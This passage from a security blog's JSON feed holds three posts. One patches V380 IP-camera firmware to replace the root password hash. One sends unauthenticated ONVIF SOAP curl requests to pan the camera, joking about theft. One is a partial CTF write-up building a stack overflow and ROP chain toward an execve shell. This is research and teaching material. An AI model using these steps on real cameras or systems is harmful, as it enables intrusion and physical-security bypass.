mtd1, the patch must contain a squashfs file with filename beginning with <code>IMG_RFS</code>.\n<code>/dev/mtd1</code> is erased using an <code>ioctl</code>, but then we just write the squashfs file system to <code>/dev/mtd1</code>.</p>\n<h3 id=\"grabbing-the-firmware\" tabindex=\"-1\">Grabbing the firmware <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h3>\n<pre><code>+ ls /dev/\nakfha_char          mem                 mtdblock0           random\nakgpio              mmcblk0             mtdblock1           rfkill\nakpcm_cdev0         mmcblk0p1           mtdblock2           root\nakpcm_cdev1         mtd0                mtdblock3           rtc0\nconsole             mtd0ro              mtdblock4           tty\ncpu_dma_latency     mtd1                mtdblock5           ttySAK0\nfull                mtd1ro              network_latency     ttyp0\ni2c-0               mtd2                network_throughput  ttyp1\nion                 mtd2ro              null                ttyprintk\nisp_char            mtd3                ptmx                uio0\nkmsg                mtd3ro              pts                 urandom\nlog                 mtd4                ptyp0               watchdog\nloop-control        mtd4ro              ptyp1               zero\nloop0               mtd5                ram0\nloop1               mtd5ro              ram1\n</code></pre>\n<p>The &quot;files&quot; <code>/dev/mtd?</code> are character devices, so function like byte streams.\nWe can make an exshell_bfu.sh patch e.g. <code>cat /dev/mtd4ro &gt; /mnt/sdcard/mtd4</code> to extract the contents of the MTD parts.</p>\n<h2 id=\"changing-the-root-password\" tabindex=\"-1\">Changing the root password <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h2>\n<p>If I want to set the root password to <code>Hello.123</code>, The shadow file hash can be changed to:</p>\n<pre><code>$ mkpasswd --method=sha256crypt --salt=EvgtGUo1zRnZRW Hello.123\n$5$EvgtGUo1zRnZRW$2A2sE5yjjsR2K6QJH0Te2rKOUGaCRXiEIgdr9e5KlO0\n</code></pre>\n<p>Looking through the files in the MTDs downloaded to the sdcard (with <code>unsquashfs -lls</code>), I found <code>/etc/password</code> in mtd1.\nNow we can make a cheeky update patch:</p>\n<pre><code>$ sudo unsquashfs -d mtdA mtd1\nParallel unsquashfs: Using 4 processors\n206 inodes (230 blocks) to write\ncreated 58 files\ncreated 26 directories\ncreated 148 symlinks\ncreated 0 devices\ncreated 0 fifos\n$ sed -i 's/^root:[^:]*:/root:$5$EvgtGUo1zRnZRW$2A2sE5yjjsR2K6QJH0Te2rKOUGaCRXiEIgdr9e5KlO0:/' mtdA/etc/shadow\n$ mksquashfs mtdA IMG_RFS_mtd1.squashfs -b 128K -comp xz\n</code></pre>\n<p>We used <code>sudo</code> so that we unsquash files with the correct owners (e.g. <code>uid=0</code>). Check that the output of <code>unsquashfs -s</code> looks the same for the old <code>mtd1</code> and patched <code>IMG_RFS_mtd1.squashfs</code>.</p>\n<pre><code>$ patchv380 IMG_RFS_mtd1.squashfs -h V380E2_CA\n</code></pre>\n<h3 id=\"lets-run-it\" tabindex=\"-1\">Let's run it <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-firmware-patching/\">#</a></h3>\n<p>Patch copied over to the sdcard correctly (as explained in the zip section above). Camera booting up.</p>\n<pre><code>copy finished normally.\ncopy finished normally.\n==== access [/dev/mtd1]\n[updater]erase mtd start...........................erase success!\n\nwrite mtd start.........................................write OK!\nhardware update finished normally === has img:[1] , has spec:[2]\n=== update success! ===\nsdcard update finished!\n...\nRestarting system.\n</code></pre>\n<p>Now we've successfully flashed our system! Time for some fun...</p>\n<pre><code>V380E login: root\nPassword:\n\nwelcome to file system\n[root@V380E ~]$\n</code></pre>\n<p>🎉</p>\n",
			"date_published": "2020-04-04T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/v380-ipcam-move-with-soap/",
			"url": "https://blog.caller.xyz/v380-ipcam-move-with-soap/",
			"title": "v380 IPcam: Move with SOAP",
			"content_html": "<p>You can remotely pan/tilt the camera so it points away from the crown jewels while you move in to steal them.</p>\n<p>I finally got a chance to play with the IPcam after leaving it in a cupboard for (amazingly) 2 years.\nThe <code>WiFi Smart Net Camera V380</code> has port 8899 open running <code>gSOAP/2.8</code>. It uses SOAP :face_vomiting: to implement the ONVIF standard for device management. Most IP camera software can talk ONVIF, so it's not so bad.</p>\n<p>I downloaded the wsdl (schema definition, I say <span class=\"ipa\">/wɪzdl/</span>) for the PTZ  (Pan-tilt-zoom) function and loaded it into SoapUI. Most of the functions weren't implemented, but two nice ones were:</p>\n<ul>\n<li>ContinuousMove</li>\n<li>Stop</li>\n</ul>\n<p>So it looks like even though the camera requires a password to be accessed via the app, it can actually be panned/tilted by anyone on the network without a password.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/9o6AGWwbwr-1130.avif 1130w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/9o6AGWwbwr-1130.webp 1130w\"><img alt=\"PTZ requests and responses\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/9o6AGWwbwr-1130.png\" width=\"1130\" height=\"688\"></picture><figcaption>PTZ requests and responses</figcaption></figure><p></p>\n<h2 id=\"examples\" tabindex=\"-1\">Examples <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-move-with-soap/\">#</a></h2>\n<pre class=\"language-sh\" tabindex=\"0\"><code class=\"language-sh\"><span class=\"token function\">curl</span> http://192.168.1.1:8899/ <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">-H</span> <span class=\"token string\">'Content-Type: application/soap+xml;charset=UTF-8;action=\"http://www.onvif.org/ver20/ptz/wsdl/ContinuousMove\"'</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--data</span> <span class=\"token string\">'&lt;soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:wsdl=\"http://www.onvif.org/ver20/ptz/wsdl\" xmlns:sch=\"http://www.onvif.org/ver10/schema\">\n   &lt;soap:Header/>\n   &lt;soap:Body>\n      &lt;wsdl:ContinuousMove>\n         &lt;wsdl:ProfileToken>blah&lt;/wsdl:ProfileToken>\n         &lt;wsdl:Velocity>\n            &lt;sch:PanTilt x=\"-0.1\" y=\"0.1\" space=\"0.3\"/>\n            &lt;sch:Zoom x=\"0\" space=\"0\"/>\n         &lt;/wsdl:Velocity>\n      &lt;/wsdl:ContinuousMove>\n   &lt;/soap:Body>\n&lt;/soap:Envelope>'</span>\n<span class=\"token function\">curl</span> http://192.168.1.1:8899/ <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">-H</span> <span class=\"token string\">'Content-Type: application/soap+xml;charset=UTF-8;action=\"http://www.onvif.org/ver20/ptz/wsdl/Stop\"'</span> <span class=\"token punctuation\">\\</span>\n  <span class=\"token parameter variable\">--data</span> <span class=\"token string\">'&lt;soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:wsdl=\"http://www.onvif.org/ver20/ptz/wsdl\">\n   &lt;soap:Header/>\n   &lt;soap:Body>\n      &lt;wsdl:Stop>\n         &lt;wsdl:ProfileToken>whatevs&lt;/wsdl:ProfileToken>\n         &lt;wsdl:PanTilt>1&lt;/wsdl:PanTilt>\n         &lt;wsdl:Zoom>1&lt;/wsdl:Zoom>\n      &lt;/wsdl:Stop>\n   &lt;/soap:Body>\n&lt;/soap:Envelope>'</span></code></pre>\n<p>Note, this doesn't give us stream access or command execution.</p>\n<h2 id=\"implemented-actions\" tabindex=\"-1\">Implemented actions <a class=\"header-anchor\" href=\"https://blog.caller.xyz/v380-ipcam-move-with-soap/\">#</a></h2>\n<p>After downloading a firmware patch and extracting with <code>binwalk</code>, I searched for the SOAP server with <code>grep -R -a gSOAP</code> and found <code>libonvif.so</code>.</p>\n<p>Then I searched the binary for names of implemented commands using <code>rabin2 -zzz</code> which often gives nicer results than <code>strings</code>. It's part of Radare2, which I have yet to learn how to use properly. Anyway:</p>\n<pre class=\"language-terminal\" tabindex=\"0\"><code class=\"language-terminal\">$ rabin2 -zzz -N 8 squashfs-root/lib/libonvif.so | \\\n    grep 'string=[^_]*:.*Response$' | \\\n    sed 's/[^:]*:\\(.*\\)Response/\\1/' | \\\n    sort -u\nContinuousMove\nGetAudioEncoderConfiguration\nGetAudioEncoderConfigurations\nGetAudioSourceConfiguration\nGetAudioSourceConfigurations\nGetAudioSources\nGetCapabilities\nGetConfiguration\nGetConfigurationOptions\nGetConfigurations\nGetDeviceInformation\nGetOptions\nGetProfile\nGetProfiles\nGetServices\nGetStreamUri\nGetSystemDateAndTime\nGetVideoEncoderConfiguration\nGetVideoEncoderConfigurationOptions\nGetVideoEncoderConfigurations\nGetVideoSourceConfiguration\nGetVideoSourceConfigurations\nGetVideoSources\nSetVideoEncoderConfiguration\nStop</code></pre>\n<p>So 25 actions in total, but I think the <code>ContinuousMove</code> is the only fun one.</p>\n",
			"date_published": "2020-03-24T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/",
			"url": "https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/",
			"title": "SecTalks CTF: ROP + ASLR = 500¥",
			"content_html": "<p>This is a write-up for a difficult Sectalks CTF challenge set by tamas which took me many hours to solve.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/fWL6VMTqnV-380.avif 380w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/fWL6VMTqnV-380.webp 380w\"><img alt=\"Solved\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/fWL6VMTqnV-380.png\" width=\"380\" height=\"150\"></picture><figcaption>Solved</figcaption></figure><p></p>\n<h2 id=\"what-you-see\" tabindex=\"-1\">What you see <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>In the challenge directory we have:</p>\n<ul>\n<li><code>flag</code>: the objective, readable only by root</li>\n<li><code>main</code>: a 64-bit suid executable binary owned by root <code>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, not stripped</code></li>\n<li><code>code.bin</code>: writeable file read by the binary</li>\n</ul>\n<p>Running the executable prints out some lines of 8-byte hex strings.</p>\n<p>Since the executable has the suid bit set, it runs as root even when invoked by non-root users. We can't directly read <code>flag</code> ourselves, so we need to find a vulnerability that lets us trick the executable into reading it for us as root, or even better, giving us a shell.</p>\n<h2 id=\"environment\" tabindex=\"-1\">Environment <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>To follow along:</p>\n<ul>\n<li>install <code>gdb</code> and the plugin <code>gef</code></li>\n<li>temporarily turn off ASLR <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></li>\n<li>install <code>pwntools</code> with <code>pip</code></li>\n</ul>\n<h2 id=\"reverse-engineering\" tabindex=\"-1\">Reverse Engineering <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>Here I describe basic operation of the executable by chucking it into Ghidra.</p>\n<p>All of the meat is in function <code>sub</code>. The <code>code.bin</code> file is read into <code>buf</code> and then processed.\nThe <code>code.bin</code> file contains instructions for operating a stack-machine.\nThe first byte of each instruction determines the opcode.\nI went through each branch to try to define the instructions. See the python code for more. Below is the annotated ghidra disassembly for some of the instructions.</p>\n<pre class=\"language-c\" tabindex=\"0\"><code class=\"language-c\"><span class=\"token keyword\">do</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>pos<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  <span class=\"token comment\">// Process opcode</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\0'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// die()</span>\n      <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x01'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// pop_to_nth_global(uint8 n)</span>\n      lVar2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>spos<span class=\"token punctuation\">;</span>\n      spos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Pop stack (increment stack pointer)</span>\n      globals<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>uint<span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>pos <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span>lVar2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Set nth global to popped value</span>\n      pos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Increment pos since this opcode has a 1-byte argument</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x02'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// push_nth_global(uint8 n)</span>\n      spos <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Push to stack (decrement stack pointer)</span>\n      stack<span class=\"token punctuation\">[</span>spos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> globals<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>uint<span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>pos <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Set top of stack to nth global</span>\n      pos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//...</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x05'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// push_uint64(uint64 i)</span>\n      spos <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n      stack<span class=\"token punctuation\">[</span>spos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">uint64_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buf <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>pos <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// Read uint64_t and push to stack</span>\n      pos <span class=\"token operator\">+=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// uint64 argument had 8 bytes, so this instruction is 9 bytes long</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//...</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x07'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// pop_add_to_top()</span>\n      iVar1 <span class=\"token operator\">=</span> spos <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n      lVar2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>spos<span class=\"token punctuation\">;</span>\n      spos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// pop</span>\n      stack<span class=\"token punctuation\">[</span>spos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span>iVar1<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> stack<span class=\"token punctuation\">[</span>lVar2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// add popped value to top of stack</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x08'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// subtract_top_from_pop()</span>\n      iVar1 <span class=\"token operator\">=</span> spos <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n      lVar2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>spos<span class=\"token punctuation\">;</span>\n      spos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// pop</span>\n      stack<span class=\"token punctuation\">[</span>spos<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> stack<span class=\"token punctuation\">[</span>lVar2<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> stack<span class=\"token punctuation\">[</span>iVar1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// top := popped - top</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//...</span>\n    <span class=\"token keyword\">case</span> <span class=\"token char\">'\\x0e'</span><span class=\"token operator\">:</span>  <span class=\"token comment\">// pop_print()</span>\n      lVar2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>spos<span class=\"token punctuation\">;</span>\n      spos <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//pop</span>\n      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%llx\\n\"</span><span class=\"token punctuation\">,</span>stack<span class=\"token punctuation\">[</span>lVar2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// print popped uint64 value as hex</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//...</span></code></pre>\n<p>The stack-machine operates on the <code>uint64_t stack[128]</code> and has state in <code>uint64_t globals[256]</code>.</p>\n<p>The first step in validating the operation of the executable is to put some of the instructions in <code>code.bin</code> and validate the output is what you'd expect. As an example, try <code>push_uint64</code>ing some values and then <code>pop_print</code>ing them.</p>\n<p>Let's fire up gdb. If you use <code>gef</code> then you can enter <code>entry-break</code> which breaks at the main function.\nRun <code>disas sub</code> and see the assembly instruction <code>0x0000555555555801 &lt;+1644&gt;:  jmp 0x55555555525c &lt;sub+199&gt;</code> which is the do-while loop going back to the switch statement. If you want to pause before each stack-machine instruction in <code>buf</code> is processed, use <code>break *sub+199</code>. Then:</p>\n<ul>\n<li><code>c</code> to continue until the next breakpoint</li>\n<li><code>ni</code> to run assembly instructions one by one, but stepping over <code>call</code>s to other functions such as <code>printf</code></li>\n<li><code>si</code> to run assembly instructions one by one including stepping inside other functions such as <code>printf</code></li>\n</ul>\n<p>We can print the stack-machine stack which is all zero due to the <code>memset</code>:</p>\n<pre><code>&gt; p stack\n$2 = {0x0 &lt;repeats 128 times&gt;}\n</code></pre>\n<p>Get familiar reading different parts of the stack-machine stack in gdb e.g. using the <code>x</code>, <code>hexdump</code> and <code>p</code> functions.</p>\n<h2 id=\"stack-overflow\" tabindex=\"-1\">Stack overflow <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>It's not possible to overflow the <code>globals</code> array as the argument is the correct size. We are instead going to play with the stack, which looks like this when empty:</p>\n<pre><code>$rsp                  $rsp+8*0x80\n$rbp-0x480            $rbp-8*16     $rbp       $rbp+8                 $rbp+0x10\n|||||||||...||||||||||| other stuff | old $rbp | saved return address | ...\n stack-machine stack ^\n                     $rsp+8*0x7f (spos=0x7f) = $rbp-8*17\n</code></pre>\n<p>If designed correctly, <code>spos</code> should be clamped between 0 (meaning the stack-machine stack is full) and 0x7f=127 (meaning the stack-machine stack is empty).\nHowever, repeated popping without pushing can cause <code>spos</code> to increase to higher addresses beyond the bottom of the stack.\nIf we make <code>code.bin</code> filled with <code>pop_print</code>s (<code>\\x0e\\x0e...</code>), we print out a load of non-zero uint64s in hex. The first value printed will be the 0 at the bottom of the stack. The 18th will be the old $rbp. The 19th will be the saved return address 0x55555822.</p>\n<h2 id=\"babys-first-pc-overwrite\" tabindex=\"-1\">Baby's first $PC overwrite <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>In <code>main</code>, we ran the instruction <code>0x000055555555581d &lt;+20&gt;: call 0x555555555195 &lt;sub&gt;</code>. This pushed the address of the next instruction (0x0000555555555822) onto the stack and then moved execution to <code>sub</code>. At the end of <code>sub</code>, the <code>ret</code> instruction pops the saved return address from the stack and moves execution back into <code>main</code>.</p>\n<p>Let's try to change this saved return address to point to some assembly instructions of our own.</p>\n<p>First, let's just try pushing a NOP (0xa8058b90) to the stack-machine stack, popping 20 times, then pushing the address of our NOP (0x7fffffffd640). Base64 code.bin: <code>BZCLBagAAAAADg4ODg4ODg4ODg4ODg4ODg4ODg4FQNb///9/AAA=</code>.</p>\n<p>Result: <code>SIGSEGV</code>. The last line in <code>dmesg</code> shows <code>segfault at 7fffffffd640 ip 00007fffffffd640 sp 00007fffffffd740 error 15</code> which means &quot;attempt to execute code from a mapped memory area that isn't executable&quot;.</p>\n<p>The executable has a virtual memory mapping that specifies read-write-execute permissions for each area of memory. Unfortunately, we won't be able to write arbitrary assembly code to the stack and execute it since the stack page is marked <code>rw-</code> (read, write, no execute). We can see the layout with the gef gdb command <code>vmmap</code>.</p>\n<pre><code>gef&gt; vmmap\nStart              End                Offset             Perm Path\n0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /blah/main\n0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /blah/main\n0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /blah/main\n0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /blah/main\n0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /blah/main\n0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fcb000 0x00007ffff7fce000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n</code></pre>\n<h2 id=\"rop-till-you-drop\" tabindex=\"-1\">ROP till you drop <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>While we can't write our own instructions, we can point to helpful instructions already present in the executable using Return Oriented Programming (ROP). Usually this is done by piecing together &quot;gadgets&quot;. A gadget is often a <code>pop</code> instruction (which puts a value from the stack into a register) followed immediately by a <code>ret</code> instruction which jumps to the next gadget in our ROP-chain.</p>\n<h3 id=\"rop-gadget-chain-toy-example\" tabindex=\"-1\">ROP gadget chain toy example <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h3>\n<pre class=\"language-asm\" tabindex=\"0\"><code class=\"language-asm\">0x100 pop rdi\n0x108 pop rcx\n0x110 ret\n0x118 pop rax\n0x120 mov $rsp, 0x007\n0x128 ret\n0x130 pop rax\n0x130 pop r10\n0x138 ret\n0x140 syscall\n0x148 push rax</code></pre>\n<p>Let's say we have a binary containing the above assembly code, and our aim is to set register <code>rdi</code> to 0xDDD and register <code>rax</code> to 0xAAA before calling <code>syscall</code>. We can do this by creating a stack layout:</p>\n<pre><code>0x100  # Gadget 1\n0xDDD  # rdi\n0x000  # rcx: can put anything here as we don't care about rcx\n0x130  # Gadget 2\n0xAAA  # rax\n0x000  # r10: can put anything here\n0x140  # Gadget 3\n</code></pre>\n<p>We have a gadget for setting <code>rdi</code> at 0x100. We need 2 values on the stack for the <code>rdi</code> and <code>rcx</code> registers, although we only care about setting the <code>rdi</code> value. We can't use 0x118 for setting <code>rax</code> as it will mess with the stack pointer before the <code>ret</code>, and we will lose control of execution. We don't care about the lack of <code>ret</code> after <code>syscall</code> as the <code>syscall</code> was our final objective.</p>\n<h2 id=\"execve-me-a-shell\" tabindex=\"-1\">execve me a shell <a class=\"header-anchor\" href=\"https://blog.caller.xyz/sectalks-ctf-rop-aslr-500/\">#</a></h2>\n<p>Our objective is to call <a href=\"http://man7.org/linux/man-pages/man2/execve.2.html\">execve</a> and launch a shell:</p>\n<pre class=\"language-c\" tabindex=\"0\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pathname<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> envp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  # unistd<span class=\"token punctuation\">.</span>h\n\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> sh<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> sh<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execve</span><span class=\"token punctuation\">(</span> sh<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>According to the <a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\">linux syscall table</a>, we need to set up our registers according to the 64-bit ABI: <a href=\"https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf\">Intel</a>. The ABI specifies which registers correspond to which arguments in the syscall.</p>\n<ul>\n<li>rax: 59 = 0x3B (execve)</li>\n<li>rdi: <code>sh</code>: pointer to null-terminated string <code>/bin/sh\\x00</code></li>\n<li>rsi: <code>args</code>: pointer to array [pointer to <code>sh</code>, 0]</li>\n<li>rdx: <code>envp</code>: we will get away with setting this register to zero</li>\n</ul>\n<p>So our desired stack should look something like (line number <code>n</code> refers to <code>$rbp+8n</code>):</p>\n<pre><code>+01 0x??? address of rax gadget (saved return address)\n+02 0x000000000000003B  # rax\n+03 0x??? address of rdi gadget\n+04 Pointer to +10\n+05 0x??? address of rsi gadget\n+06 Pointer to +11\n+07 0x??? address of rdx gadget\n+08 